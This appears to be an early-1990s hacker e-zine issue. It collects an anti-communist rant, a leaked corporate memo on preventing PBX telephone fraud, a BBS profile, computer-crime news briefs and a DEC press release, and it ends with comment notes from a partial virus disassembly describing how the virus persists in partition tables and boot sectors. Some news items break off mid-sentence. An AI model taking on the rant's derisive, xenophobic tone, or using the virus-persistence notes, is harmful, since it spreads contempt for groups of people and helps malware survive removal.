 Section [2]: Communists Alive and Well in the U.S.
              By: Red Dawn

  The Berlin Wall came down, and its about time. But the RED Menace is alive
 and Well folks. The So called Russian Republics (Soviet DisUnion) haven't
 gone anywhere. So why are the piss ant politicians in the U.S. rolling over
 and playing Dead? Money, Yes its that simple Money.
  One world Government means power and power means money and as long as our
 leaders are more concerned about filling thier pockets and not filling
 peoples stomachs, were on our own.
  The Chinese Communists just exploded the largest underground nuclear blast
 ever, the Soviets still have there nukes and the PLP is alive and well here
 in the U.S.
  On a recent jaunt up to MIT, I was approached by a PLP (Progressive Labor
 Party) member. The PLP is the American Communist Party for those who are new
 to this. He asked if I'd like to buy a copy of "Challenge" (The Revolutionary
 Communist Newspaper) I said No, but I'll take this copy for free comrade.
 and walked off with the poor little Reds paper.
  NOTE: Please dont feel bad for the Red, Communism states whats yours is mine
        so I was just teaching him about true Communism control
  Now the PLP is getting smart, they are recruiting Puerto Ricans and other
 third world spanish speakers, as the lead story is "STOP RACIST REPATRIATION
 OF HAITANS" and the paper is now half spanish.
  What better way to boost your cause then appeal to an already unrestful
 group of people.
  Well I say enough, lets show the Communists that we can take America Back
 by unseating mailing them your thoughts.

 Section [3]: TeleFraud: (A Case Example)
              By: Anonymous

  Hacking and Phreaking has long been a game of cat and mouse, between
 Hacker and System Administrator. In a role reversal I'd like to present
 the response of an Undisclosed Insurance Company to hackers penetrating
 thier system by presenting the memo distributed to system operators.

-------------------------------------------------------------------------------
 From the Director of Systems Security to all employees:

  We have experienced telephone fraud (TeleFraud) in which outsiders,
 (I.E. Hackers) penetrated a regional office telephone system and made long
 distance calls that were charged to the company (In one case the cost of
 those calls was about $27,000) A number of steps are being implemented to
 elimanate this exposure) We want to inform you about some of them, and ask
 for your help and cooperation.

 NOTE: This article may contain terminology new to you. A "Definition of Terms"
       is included on the last page to help clarify these terms.


 BACKGROUND:

  The most common form of telefraud involves the use of 800 numbers,credit
  cards, and third party calling. Hackers get these numbers from a number of
  sources, such as:

  A. Advertisements

  B. Eavesdropping (e.g. when you charge your telephone call to another number
     while using a public telephone)

  C. Using old company telephone books and manuals that contain numbers of
     Key System or Private Branch Exchange (PBX) systems, which are the heart
     of our internal telephone system.

  Technically sophisticated hackers dial these numbers, and through computer
 program routines, determine authorization codes.
  Having learned these codes, they post them on computer bulletin boards or
 sell them. Literally within minutes unauthorized calls are passing through
 the system.
  To reduce or eliminate this exposure, our department as well as others are
 working together to protect our telephone systems. Some of these protection
 measures include:

 1. Development and implementation of controls in conjuction with our telephone
    vendors (e.g. AT&T and MCI) to restrict access to certain telephone
    features. Some of these controls include prohibiting the use of Remote
    Access,trunk to trunk,and DISA services.

 2. Making you, as telephone users, aware of this problem and identifying ways
    you can help. This memo is part of this program.

 HOW CAN YOU HELP?:

 Here are some suggestions:

 Telephone Credit Cards:

  1. Don't give your credit card number to anyone
  2. When calling from a payphone, use card readers whenever possible.
  3. Don't read the number loud enough for others to hear, or let others
     observe you entering your number.
  4. Report lost or stolen cards immediately.
  5. Use your body to block the view of someone who may be watching to see the
     access code you are punching into the telephone.

 800 Service:

  1. Don't install an 800 number unless it's absolutely necessary.
  2. Remove the line when it's no longer needed.
  3. Limit 800 service to applications that are answered by people.
  4. Avoid 800 service to Phonemail or Voice Response Units (VRU).

 International/Domestic Toll Calls:

  1. Block country and/or area codes that you don't call.
  2. Limit the use of International Class of Service at the handset level.
  3. Block 900 calls with the local telephone company.

 Dial Data Lines:

  1. Block third party calling with the local telephone company.
  2. Establish VNET range restrictions

 Remote Access:

  1. Disable this feature on the PBX. We have surveyed our PBX vendors
     country-wide to ensure these facilities are not enabled.

 Trunk-to-Trunk:

  1. Disable this feature on the PBX. We have surveyed our PBX vendors
     country-wide to ensure these facilities are not enabled.

 Phonemail:

  1. Change passwords frequently
  2. Deactivate unused mailboxes
  3. Limit the number of "Guest" mailboxes
  4. Don't publish the system access number to anyone who doesn't use
     phonemail.
  5. Lock out the subscriber after three unsuccessful attempts to enter the
     mailbox.
  6. Keep system administrator ID's secret and change them frequently.

 Third Party Calling:

  1. Request the local telephone company to block third party calling on
     dial data,fax,and private lines.
  2. Limit the installation of private lines

 PBX (Private Branch Exchange):

  1. Do not reveal maintenance port passwords to callers without positive ID
  2. Delete unused extensions

 VRU (Voice Response Units):

  1. Do not enable trunk-to-trunk transfer.
  2. Program only a select number of extensions to which callers can be
     transferred (i.e. establish a table of extensions).
  3. Do not program station transfer
  4. Passwords, (e.g. logon ID's customer PIN's) should be carefully protected
     and changed frequently.

 Automated Attendant:

  1. Do not enable trunk-to trunk transfer.
  2. Do not program station transfer
  3. Delete unused extensions
  4. Deactivate software features if not in use.

 Hardcopy Listings:

  1. Properly dispose of old telephone books,manuals,or telephone bills that
     contain sensitive telephone numbers.
  2. Review all telephone charges,looking for patterns and excessive charges.

 Dial Access to Computers:

  1. Secure dial lines to all computer systems.

 Miscellaneous:

  1. Be cautious of unusual situations with your telephone system, such as
     busy signals at odd times.


                          DEFINITION OF TERMS


   PBX

   Private Branch Exchange. Private automatic system that provides for the
   switching of calls internally, and to and from the public telephone
   network.

   Trunk-to-Trunk

   A "trunk" is the telephone line that connects a PBX to the telephone
   company. Therefore a trunk-to-trunk connection ties a PBX system to the
   telephone company.

   DISA

   Stands for Direct Inward System Access. This feature gives an outside
   caller the ability to dial directly into a PBX system, without attendant
   (i.e. operator) intervention, and gain access to the PBX system facilities
   and outgoing circuits. DISA software should be disabled, thus eliminating
   this feature/exposure.

   Voice Mail

   Hardware and software products that can be integrated or peripheral to a
   PBX system, allowing users to send,receive,and redirect voice messages
   through office telephone systems and computers.

   Automated Attendant

   An automated telephone system used to accept incoming calls and direct
   their callers to specific extensions based upon the caller entering touch
   tone numbers. For example, a hacker could call someones Voicemail mailbox
   from the outside and try to break in.

   VRU (Voice Response Unit)

   An interactive system that interfaces between the PBX and host computer
   based upon information provided by the caller (e.g. account number,social
   security number)

   Remote Access

   Allows a caller at a remote location to access PBX features by telephone.
   Individual authorization codes are usually required. Remote access allows
   the caller to potentially access an outside (e.g. long distance) line,
   and is usually accomplished through the use of DISA or automated
   attendant features.

   VNET (Virtual Network)

   A registered MCI service that offers a range of telephone limits and/or
   restrictions (e.g. allows calls only within U.S., does not allow calls to
   Virgin Islands,etc.)

   Key System:

   A small, multi-line internal telephone system similar to a PBX.
   Norstar,Spirit,and Merlin are examples of a key system.



   Remember: All of us are potential victims of telephone fraud. Hackers are
             determined to use our telephone system and not pay for that
             service. Please be as determined to ensure they do not.

Sysop: Pipers Pit BBS

Background:

   Piper Started his original Commodore oriented BBS in March 1985. The Board
  was originally run off of a C-64 with 2 SFD 1001's. Continually upgrading his
  system Piper switched from his original C-Net configuration to Color 64
  with a C-128 with 1750 Ram expander and 2 ICT Data Chief HFD20's.
   It was at this time that Piper met Mercenary at the now defunct CompuTech
  systems and started attending the original IIRG meetings at the Bar and
  pizza joint next door.
   With the Commodore community rapidly dwindling and the IIRG no longer
  supporting the C64/128, Piper sold his Commodore BBS for a $400.00 profit
  over what he invested in it and Bought a 286/12 and an Amiga 1000 with
  1.5 megs.
   Now, with the his vast majority of users being IBM, Piper has switched
  to a 386/33 Tower with 1300 Megs of storage,2 Nodes (HST and HST D/S.
   But being true to his roots, Piper still supports the Amiga line.

-------------------------------------------------------------------------------

                       I GOT EM,I GOT EM, I GOT EM....

 Arizona Law officers are fuming that the U.S. Justice Department is taking
 credit for the first successful prosecution under the Operation Sundevil
 computer crime investigation. They point out that they nabbed and convicted
 two hackers swept up in the nationwide crackdown on computer crime several
 months ago. One of the hackers is still doing time in a halfway house after
 spending six months in "shock incarceration," a boot camp for first time
 offenders.

-------------------------------------------------------------------------------

                         POOR LITTLE BIG BROTHER....

 Difficulties tapping advanced digital telephone networks for criminal
 investigations have inspired the Federal Bureau of Investigation to propose
 legislation requiring carriers to modify their networks to accommodate court
 approved wiretaps. The multimillion dollar cost of re-engineering the
 networks would be borne by rate payers. Civil liberties groups said a built
 in tapping capability might encourage overly broad government surveillance.

-------------------------------------------------------------------------------

              COULD I GET SOME MINT JELLY WITH THAT PLEASE?

 A man charged with stealing computer boards from Digital Equipment Corporation
 between February and October 1990 recently received the severed head of a lamb
 wrapped in towels through the U.S. Mail. The box arrived at the Lexington,
 Mass., home of Edward Desmond Jr. on Feb 28th. Desmond had cooperated with the
 government during part of the 2 1/2 year investigation, which led to the
 indictment of 16 people. A plea agreement with Desmond was reportedly
 rescinded after he was caught commiting other crimes.

              INTERNET ADVISORY BOARD SETS S.N.M.P. SECURITY RULES

 The Simple Network Management Protocol (SNMP) security specifications now
 before the Internet Advisory Board would provide the following features:

 1. A data-encryption standard based specification that encrypts messages
    between the SNMP manager and agent. This is useful for sending down new or
    updated keys that determine what management functions a SNMP station can
    access or that define authorization levels within a station.

 2. Origin Authentication that prevents unauthorized users who have obtained
    an SNMP workstations access code from masquerading as an authentic user.

 3. Replay protection that keeps a user from delaying an SNMP transmission,
    such as a command to take a workstation offline, and sending it at a later
    date.

 4. Message integrity that keeps authorized users from changing the contents
    of a SNMP message.

                  BOOK PUSHER SEEKS TO INFLATE EGO

 Computer Security Expert Winn Schwartau, whose book, Terminal Compromise,
 describes how a terrorist gang could paralyze the U.S. with a computer virus,
 sees a parrallel between his text and real life.
 "When the Michelangelo virus scare began, it was eerie, like somone had lifted
 the events right out of my book," he says. "Viruses are evolving into a
 terrorist's weapon and are certainly a viable means of waging warfare."
 Terminal compromise is published by Pittsburg-Based Inter-Pact press.

 IIRG Note: This Jack Ass will say anything to sell his book, so save the
            $19.95 and go out and get drunk instead. The book is pure

                   JACKASS's and MORE JACKASS's

 The Associated press reports that the theft of a portable PC in Australia was
 solved when the thief sent a fax to the unit's maker, DFM Systems of Des
 Moines,Iowa asking for a power cord,documentation, and software.
 What the crook didn't know was the DFM TraveLite PC was the only such system
 in Australia. The unit was owned by Sydney based ACEL, which the thief had
 burglarized. DFM contacted ACEL's managing director, who then contacted the

                TWO AT CORNELL INDICTED IN VIRUS CASE

 Two Cornell University students now have been indicted for felonies in
 connection with the computer virus case that came to light last
 February at the Ithaca, N.Y., university.

 David Blumenthal and Mark Pilgrim are accused of embedding a virus in
 three Apple Macintosh computer games that were sent from Cornell's
 computer center to an archive at Stanford University. Authorities say
 from there, the games were duplicated and wound up in computers across
 the U.S., Japan and Great Britain.

 Blumenthal, 20, and Pilgrim, 19, who, in convicted, face a maximum
 four years in prison, were arrested in February on misdemeanor
 charges, which were increased to felonies because the virus is
 believed to have caused more than $1,000 in damage, said county
 District Attorney George Dentes.

       AT&T INTRODUCES PRODUCTS TO FIGHT PHONE FRAUD  NEW YORK (Reuter)

-- American Telephone & Telegraph Co. rolled out a new security program
yesterday aimed at protecting businesses from anyone who might try to "steal"
their long-distance telephone service.  Branding phone fraud as a nationwide
problem costing upwards of $1.2 billion a year, the company said its AT&T
NetProtect program gives customers the products, services and education they
need to combat such fraud, as well as protection against financial liability.

  Long-Distance fraud often takes place when an outsider, say a computer
hacker, cracks the access codes to a company's private branch exchange, or PBX
-- an internal phone system that allows easy access to branch offices and major
customers.  The PBX can then be used to place long-distance or international
calls as if by someone inside the company.  The practice, a misdemeanor crime
with no jail sentence in many states, typically is done for monetary gain. The
"stolen" service can be sold on the street, sometimes providing drug
traffickers with international calls that cannot be traced.  "Long-distance
fraud is a serious criminal problem, and we believe AT&T should stand squarely
with our customers against the criminals who steal the service," said Joseph
Nacchio, president of AT&T's Business Communications Services division.  AT&T,
the long-distance carrier created by the 1984 breakup of the former Bell
telephone system, said its new program would relieve customers from liability
for the fraud.  The company this week began monitoring its toll-free 800 service
at no extra charge to prevent fraud. From Aug. 1, it also will monitor inter-
national long-distance service to countries experiencing high levels of fraud.

  An AT&T spokesman declined to disclose the cost for enhanced and premium
services that protect customers from financial liability, saying the cost
structure has not yet been filed with the Federal Communications Commission.

  Other packages include a $1,995 software package that alerts customers to
unusual calling patterns and a $150 an hour intervention service under which
AT&T experts try to stop fraud while it is in progress.

                     WORLDWIDE MOBILE DATA SOLUTIONS

  ATLANTA -- May 18, 1992 -- Digital Equipment Corporation, RAM Mobile
 Data, and BellSouth Enterprises, Inc. today announced a worldwide
 agreement to provide mobile data solutions based on the Mobitex
 mobile packet radio network.
  Under the agreement, Digital will offer two-way wireless
 electronic mail to its more than three million existing ALL-IN-1
 integrated office system customers. Digital is developing a
 version of its Mobilizer for ALL-IN-1 software that will enable
 users of portable MS-DOS PCs to access ALL-IN-1 electronic mail
 applications without a connection to a telephone outlet.
  Digital plans to provide the same services on the Mobitex
 mobile network in the United Kingdom. In addition, wireless
 electronic mail services will be offered to customers in several
 other countries where RAM and BellSouth plan to operate Mobitex
 networks. Digital's wireless electronic mail offering will be
 available in the first quarter of calendar year 1993.
  Digital also announced the DECmobile program, under which
 the company will deliver fully integrated, end-to-end mobile data
 communications solutions that extend enterprise computing
 networks to mobile users. The announcements were made at the ICA
 telecommunications industry conference held here May 18-21.
 "With these announcements, Digital is moving aggressively
 into the fast-growing mobile data market," said Ernst E.
 Wellhoener, vice president of Digital's Telecommunications
 Business Group. "We are supporting our commitment with
 substantial investments of time, money, and resources to build
 the kinds of mobile data solutions our customers require."
  Digital Becomes RAM Mobile Data Systems Integrator
 Under the DECmobile program, Digital will offer customers
 complete mobile data solutions, acting as systems integrator for
 RAM Mobile Data and other service providers.  Digital will
 provide a single point of contact for customers seeking to
 benefit from new mobile data communications services.
  Digital is entering into business relationships with leading
 suppliers of radio modems, handheld PCs, and cellular devices.
 The company currently has relationships with Ericsson Mobile
 Communications AB, Fujitsu Personal Systems (formerly Poqet
 Computer Corporation), and Husky Computers, Inc.
 "The move into mobile data represents a natural progression
 for Digital, a leader in providing networked computer systems and
 one of the computer industry's foremost systems integrators,"
 Wellhoener said.  "Our ability to provide 'one-stop shopping' for
 mobile data solutions helps simplify what might otherwise be a
 difficult process for our customers, enabling them to get
 up-to-speed faster and more cost-effectively."
  Wellhoener said Digital chose Mobitex networks because they
 are feature-rich, sophisticated, and highly efficient. "And
 perhaps most important, the worldwide scope of Mobitex networks
 will enable us to meet the needs of today's multinational
 enterprises," Wellhoener added.

  Mike Harrell, president of BellSouth Mobile Data, Inc., said
 the alliance would enable mobile data network subscribers to take
 advantage of Digital's worldwide systems integration
 capabilities. "Aligning ourselves with an experienced systems
 integrator ensures our network subscribers have the most
 effective solutions," Harrell said. "We can now expand the market
 for Mobitex into a broad range of networked computer applications."
  Carl Robert Aron, chairman and CEO of RAM, said, "ALL-IN-1
 is the world's leading host-based application that includes
 electronic mail.  RAM's Mobitex network is the only mobile data
 network in operation which automatically delivers E-mail messages
 to mobile professionals wherever they are within the network
 service area. The marriage of Mobitex and Mobilizer for ALL-IN-1
 was inevitable."
  Digital Develops Mobile Data Products and Programming Tools
 In addition to developing a wireless interface for its
 Mobilizer for ALL-IN-1 product, Digital is developing an open
 software architecture and a single set of application programming
 interfaces that will be available to software developers. The
 architecture and application programming interfaces, or APIs,
 facilitate the integration of new and existing mobile applications
 for RAM's and other service providers' networks.  APIs make it easy
 for developers to write mobile data applications.
  BellSouth Mobile Data is a subsidiary of BellSouth
 Enterprises, Inc., the holding company that manages a group of
 companies for BellSouth Corporation that provide wireless
 telecommunications, advertising and publishing, and
 information-based services throughout the world.
  RAM Mobile Data operates a wireless data communications
 service in major metropolitan areas across the nation.  Using
 RAM's service, companies exchange two-way messages and data with
 field personnel equipped with mobile, portable, or handheld
 terminals.  RAM Mobile Data Ltd. operates a similar, compatible
 system in the United Kingdom.  RAM's radio-based data
 communications network architecture is Mobitex, an international,
 open standard supplied by Ericsson.
  RAM has exclusive use of the Mobitex technology in the
 United States. Mobitex was developed by Ericsson Mobile
 Communications AB and Swedish Telecom. Digital and Ericsson last
 year signed a cooperation agreement under which the two companies
 will develop software tools for the integration of Digital's
 products with the Mobitex network.

  ALL-IN-1, DECmobile, the Digital logo, and Mobilizer for ALL-IN-1 are
  trademarks of Digital Equipment Corporation.
  Mobitex is a registered trademark of Swedish Telecom
  MS-DOS is a registered trademark of Microsoft Corporation.
  RAM Mobile Data's legal name is RAM Mobile Data USA Limited Partnership

               HONEST OFFICER!, HE SAID HE BOUGHT THE STUFF

  Microsoft and the FBI recently raided four Silicon Valley companies
 seizing bootleg copies of MS-DOS 5.0 and Windows 3.0 as well as associated
 manuals with a street value of more than $180,000. The Tip-off came when
 distributors tried to sell MS-DOS 5.0 seperately.

                       BIG MAC ATTACK FOILED

  Two Cornell University students have been accused of creating a computer
 virus called MBDF-A, that infected computers around the world.
  David Blumenthal,20 and Mark Pilgrim,19 face a maximum four years in prison
 for allegedly hiding the virus in three Macintosh computer games that were
 sent via modem from Cornell's computer center to an archive at Stanford.
  Macintosh PC's across the USA,Great Britain,and Japan were infected when
 users downloaded the games. Once in the Macs the virus destroyed the operating
 system.
  The two were arrested on misdemeanor charges which have been increased to
 felonies because the virus may have caused more than $1,000 in Damage.

;Last notes this virus looks like a poor hack job on the stoned virus.
;It is kinda cool in the fact that it is hard to get out of the partition table
;even if you nuke the partition table it will live on even if you replace it.
;the only way to get it out of the partition table is 1. debug 2.clean ver 86b
;3 cpav 1.0 and above. oh yeah and all that special shit that came out for it
;this virus uses int 1ah which doesn't work on an XT system.
;the virus isn't actually 512 but that is how much it writes.
;it moves the boot area of a floppy to the last sector on the disk
;and on a harddrive it moves it to the last sector in the root directory
;This should show you all how much the media can over do it on things
;since this is really a lame virus, to tell you the truth there is a lot better
;ones out there.
;This in no way is a complete listing of the code for the virus.
;Nor is it the best since i'm not the best at Assembly.
;Done by Visionary.
;BTW to who ever wrote this virus... Get a life!
